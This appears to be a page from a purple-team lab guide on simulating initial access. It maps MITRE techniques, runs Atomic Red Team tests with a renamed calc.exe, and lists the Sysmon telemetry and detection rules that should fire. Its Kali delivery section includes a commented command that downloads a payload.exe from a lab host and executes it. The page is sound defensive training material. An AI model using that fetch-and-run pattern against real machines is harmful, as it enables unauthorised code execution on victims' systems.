# Initial Access

Deliver a payload to the victim and establish a foothold. Detections focus on **process creation** and **file creation** on the endpoint.

## MITRE mapping

| Technique | ID | Atomic test |
|-----------|-----|-------------|
| Phishing: Spearphishing Attachment | T1566.001 | — (manual ISO/email sim) |
| User Execution: Malicious File | T1204.002 | T1204.002 |
| Drive-by Compromise | T1189 | — |
| External Remote Services | T1133 | — |

## Lab scenario

Attacker (Kali) hosts a payload; victim user `labuser` downloads and executes, or attacker delivers via SMB.

## Atomic Red Team (victim — PowerShell as labuser)

```powershell
# Clone atomics on victim first
cd C:\AtomicRedTeam\atomics

# T1204.002 — User opens malicious executable (simulate with benign calc copy)
Invoke-AtomicTest T1204.002 -TestNumbers 1

# T1566.001 simulation — drop file to Downloads and execute
Copy-Item C:\Windows\System32\calc.exe $env:USERPROFILE\Downloads\invoice.exe
Start-Process "$env:USERPROFILE\Downloads\invoice.exe"
```

## Kali delivery (alternative)

```bash
# Simple HTTP server on host-only
cd /tmp/payloads && python3 -m http.server 8080

# On victim (simulate user click):
# Invoke-WebRequest http://192.168.56.20:8080/payload.exe -OutFile $env:USERPROFILE\Downloads\payload.exe
# Start-Process $env:USERPROFILE\Downloads\payload.exe
```

## Expected telemetry

| Log source | Event ID | Evidence |
|------------|----------|----------|
| Sysmon | 11 | FileCreate in `\Downloads\` |
| Sysmon | 1 | ProcessCreate `invoice.exe` / payload |
| Security | 4688 | New process with subject `labuser` |
| Sysmon | 3 | Optional network to `192.168.56.20` |

## Detection (see `detections/detection-rules.md`)

- **DET-IA-001** — Executable from Downloads with unusual parent (explorer → unknown binary)
- **DET-IA-002** — First-time SHA256 hash on host

## Response pointer

`response/incident-response.md` → **Initial Access**

## Screenshot checklist

- [ ] Sysmon EID 1 in Event Viewer
- [ ] Splunk search `DET-IA-001` hit
- [ ] Dashboard panel increment

## Safety

Use **benign** binaries (calc.exe copy) or Atomic defaults; never use live malware.
